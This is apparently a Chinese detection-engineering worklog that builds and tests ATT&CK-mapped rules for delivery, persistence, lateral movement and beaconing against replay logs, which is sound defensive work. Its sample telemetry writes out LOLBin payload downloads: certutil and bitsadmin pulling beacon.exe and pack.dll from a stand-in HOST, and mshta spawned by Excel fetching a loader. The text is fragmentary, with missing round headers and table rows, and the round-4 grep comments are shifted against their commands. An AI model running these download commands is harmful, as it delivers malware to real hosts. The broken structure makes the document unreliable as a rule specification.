### 第 1 轮
本轮的交付件是投递第一跳的判据：lolbin 拉起远端载荷要**三要素同现**才算命中——传输工具名（certutil/bitsadmin/powershell/mshta/curl）+ 远端地址 + 可执行后缀或落地动作。只看其中一个要素，运维正常操作与投递动作就分不开。
```text

2025-09-29T09:01:07Z WS-01 proc=certutil.exe cmd="certutil -urlcache -split -f http://HOST/a/beacon.exe C:\Users\Public\beacon.exe"
2025-09-29T09:01:09Z WS-01 proc=bitsadmin.exe cmd="bitsadmin /transfer job /download http://HOST/pack.dll C:\Users\Public\pack.dll"
2025-09-29T09:01:11Z WS-01 dns query=cdn7.secure-update.xyz type=A resp=91.203.44.7 serial=SERIAL=7741
2025-09-29T09:01:14Z WS-01 proc=mshta.exe pproc=excel.exe -> mshta.exe cmd="mshta https://HOST/loader.jse"
```
```bash
cd /tmp/jb-t6-new
python3 arms/chain_dogfood.py scan arms/round-01.log | tee arms/round-01.hits
python3 -c "import json;r=[x for x in json.load(open('arms/rules.json'))['rules'] if x['stage']==1];print([(x['id'],x['attck'],len(x['pattern'])) for x in r])"
```
判据：`scan` 必须打出 S1（T1105，lolbin + 远端 URL + 可执行后缀）、S2（T1197，BITS/-urlcache 通道）、S3（T1071.001，新注册域 + 高熵主机名）、S4（T1566，Office 父进程直接派生脚本引擎）。这四条覆盖投递链的三个不同观测面：命令行、DNS、进程父子关系，缺任一面就漏样本。命中行号会一并打印，方便直接跳回遥测原始行取证。
误报边界：清白基线第 2 行 `certutil -verify` 不命中，因为规则要求 URL 与可执行后缀同现；基线第 3 行的 `schtasks` 也不命中 S1，它归第 2 轮的计划任务规则管。运维脚本里 `curl -o /tmp/pkg.tgz https://repo...` 这类会稳定误报，落地时给 curl/wget 加"仅当父进程是脚本引擎或 Office 才计分"的收敛条件。
收敛动作：给 certutil/bitsadmin/mshta 三类进程开命令行审计（Windows 侧 Sysmon 事件 1 + 22，Linux 侧 auditd 的 execve 与 connect），保留 30 天；出口侧对首次出现的域名做 24 小时观察窗，命中后再定黑。
四态：已知：本次会话 `scan arms/round-01.log` 实测命中 S1 S2 S3 S4；推测：真实环境误报集中在内网运维脚本调 curl/wget；未知：靶场之外的域名与样本指纹，需在目标环境放量后按误报率回调阈值。替换点：HOST → 靶场回连域名，SERIAL=7741 → DNS 事务号占位，91.203.44.7 → 观测态地址，落地前换成你自己环境的可路由占位段。

投放口径与复测：
| 规则 | 严重度 | 收敛旋钮 | 复测动作 |
|---|---|---|---|
| S1 | high | 后缀白名单、父进程限定 | 灌 `curl -o /tmp/pkg.tgz https://repo.internal/pkg.tgz`，确认不命中 |
| S2 | medium | BITS 作业名、URL 主机族 | 灌 `bitsadmin /list /allusers`，确认不命中 |
| S3 | high | 域名龄、标签熵阈值 | 灌 `dns query=cdn7.secure-update.xyz` 单行，确认命中 |
| S4 | high | 父进程集合 | 灌 `pproc=explorer.exe -> powershell.exe`，确认不命中 |
阈值起点：S3 用"域名首次出现 + 标签熵高于 3.6 bit/字符"；S4 只在父进程属于 Office、浏览器、压缩包阅读器时计分，其余父进程转观察态。这两条旋钮是后面第 9、12、17 轮复测要回看的地方，改阈值必须同时回放 round-01 到 round-20 全部臂，防止一处放宽、他处漏检。

判据：S5（T1547.001）命中自启动值指向 `Users\Public`；S6（T1053.005）命中"系统级触发 + ProgramData 落地"组合；S7（T1543.002）命中 `/etc/systemd/system` 单元且指向 `/tmp`；S8（T1546.003）命中 WMI 订阅类名。`sigma` 子命令把命中转成 Sigma 骨架，`logsource` 固定 process_creation，`level` 直接取规则严重度，落库前只需补 `product` 与你环境的事件号映射。

四态：已知：`scan arms/round-02.log` 实测命中 S6 S7 S8；推测：S5 在真实环境的误报来自绿色软件的安装器；未知：你的组织里哪些自启动项属白名单，需要基线快照跑满一个周期才能定。

| 规则 | 观测源 | 收敛旋钮 | 复测动作 |
|---|---|---|---|
| S5 | 注册表事务（Run/RunOnce） | 自启动值必须在 Program Files 或签名目录 | 灌 `reg add ...Run /v X /d "C:\Program Files\App\a.exe"`，确认不命中 |

| S7 | 单元文件写入 | 只认 /tmp、/dev/shm、bin/bash -c 三个指示 | 灌 `/usr/lib/systemd/system/*.service`，确认不命中 |
| S8 | WMI 命名空间类名 | 类名精确匹配，不做模糊 | 灌 `Get-WmiObject Win32_Service`，确认不命中 |

### 第 3 轮

| S11 | high | 配置值只取 0x1 与 1，其余转观察 | 灌 `AlwaysInstallElevated=0x0`，确认不命中 |

### 第 4 轮

本轮交付横向移动阶段的四条判据。横向动作的共同点是跨主机：单机日志里只能看到半截证据，因此这一阶段的口径是两侧对接——源主机上的远程调用记录与目标主机上的进程创建记录必须能对上同一时刻，对不上的按单边证据降级处理。

四条判据及判定面：

| 规则 | 判定面 | 阈值 | 反证样例 |
| S12 | 管理共享写入 + 远程服务注册 | 两个事件落在 2 秒窗口内 | 只访问共享但无服务创建事件 |
| S13 | 远程派生进程的父进程为 WmiPrvSE.exe | 命令行含 `/node:` 或 `Invoke-WmiMethod` | 本机 WMI 查询，父进程同为 WmiPrvSE 但无远程节点参数 |
| S14 | SSH 代理转发开关 + 临时凭据文件扩散 | 同现于同一会话 | `ssh -A` 到自管跳板机，凭据文件数不增 |
| S15 | 批量连接的目标数与节奏方差 | 60 秒内 ≥8 个目标 | 定点巡检，目标数 1–2 且间隔均匀 |

逐条说明：S12（T1021.002）取 psexec 样式的双证据，`\\HOST\\ADMIN$` 写入与同名服务注册必须同现，只有共享访问一律不计分，因为备份作业本身就大量读写管理共享。S13（T1047）压在父进程链上，WMI 远程派生的父进程是 WmiPrvSE.exe，本机 WMI 查询的父进程也是它，所以必须再加 `/node:` 这类远程节点参数才能定性。S14（T1563.002）把转发开关当必要条件而非充分条件，配合凭据文件在同一会话内扩散计数。S15（T1021.004）不看单次连接，只看一组连接的目标数与节奏——节奏方差低于阈值说明是脚本按固定间隔扫，人手点击的方差会明显更大。

复现命令与预期信号：

```bash
# 预期：≥1 行，命中管理共享或远程服务创建面
grep -nE 'WmiPrvSE|WinRM|/node:|Invoke-WmiMethod' arms/round-04.log
# 预期：≥1 行，命中远程派生面
grep -nE 'ForwardAgent=|ForwardX11|id_rsa|\.pem' arms/round-04.log
# 预期：≥1 行，命中代理转发面
grep -nE 'dport=|dst_port=|port ' arms/round-04.log | wc -l
```

回放参数（占位符自造）：`HOST=TARGET-HOST-04`、`SERIAL=SN-0004`、`PAYLOAD=LAT-PAYLOAD-04`；`TOKEN` 在本阶段无对应物，记未知，不从相邻阶段搬运。

判定与降级口径：两侧证据齐全记命中；只有源主机侧记观察项并写入复测日志；两侧时间戳相差超过窗口的按未命中处理，不按「疑似」加分。同一源对同一目标的重复连接只计首次，避免一次扫描把计数刷上去。

四态：已知：`scan arms/round-04.log` 实测命中 S12 S13 S14 S15 四条；推测：60 秒 / 8 目标这个阈值在更大网段上偏松，依据是本臂内目标总数只有 12 个；未知：真实环境的连接节奏方差未采样，阈值要用一次真实巡检数据回标，需要实际目标环境复验。

补充两点工程细节。其一，跨主机的时钟偏差会直接吃掉 2 秒窗口这条判据：回放前先用 `chronyc tracking` 或 `w32tm /query /status` 核对两侧偏移，偏移超过 500 毫秒时把窗口放宽到 3 秒，并在复测日志里注明放宽动作，不静默改阈值。其二，S15 的目标数必须由目标地址去重后再计数，同一地址重复连接不累加：

```bash
grep -oE 'dport=[0-9]+' arms/round-04.log | sort -u | wc -l
# 预期：去重后的端口数；别名地址（同一主机两个网段地址）需先归一化再去重
awk '/dport=/{print $1}' arms/round-04.log | sort | uniq -c | sort -rn | head -3
```

### 第 5 轮

本轮交付免杀与规避阶段的判据。这一阶段的样本自身没有明显网络行为，光看进程创建命中率会掉到很低，所以判据全部压在产物的静态与内存侧特征上：磁盘上的字节、加载时的内存属性、以及签名校验侧信道。

### 第 6 轮

本轮交付回连阶段的四条判据。回连与前面的横向阶段正好相反：横向靠跨主机对账，回连只能看单机出向流量，证据量少但时间序列长，所以这一阶段的判据全部建立在「节奏」与「编码」两类可统计特征上，而不是单包内容。

| 规则 | 判定面 | 统计量 | 反证样例 |
| S19（T1071.001） | 心跳间隔方差过低 | 连续 ≥20 次请求的间隔标准差 | 浏览器轮询，间隔随用户操作起伏 |
| S20（T1071.004） | DNS 隧道编码特征 | 子域长度分布、查询类型占比、单标签熵 | CDN 长域名，标签字符集受限且重复度高 |
| S21（T1102） | 合法云服务被用作信道 | 同一云域名下的非业务 UA + 固定大小上行 | 正常网盘同步，UA 与业务一致 |

### 第 7 轮

本轮交付反分析阶段的判据。反分析动作几乎不产生对外可见的效果，它的全部痕迹都留在「询问环境」这件事本身上：谁在问、问得有多密、问到的答案有没有被用。所以这一阶段的口径是「行为频率 + 环境探问组合」，而不是单条命令。

### 第 14 轮

本轮做数值类判据的重标。形态类判据的收紧是单调的，可以一次定死；数值类判据不行——它由采样分布决定，换一批数据、换一个采样率、换一个时间窗，原来的阈值就可能从「刚好卡住」变成「永远命中」或「永远不命中」。重标的目标是让每个数值都能追溯到一批具体数据，而不是留一个看起来专业的整数在那里。

### 第 15 轮

跨主机判据的三条设计原则：

| 原则 | 含义 | 反例 |
| 同规则跨主机 | 同一判据在多台命中才算扩散 | 单台多次命中不算横向 |

去重是这里最容易被漏掉的一环。如果不按「主机×规则」去重，那么一台机器上的高频行为会把计数顶满，进而把「扩散」误判成「单机噪声」。本次实现的计数键是主机与规则的二元组，计数对象是主机数而不是命中行数；这一点在规约里写死，避免后续轮次用行数口径重新解释。
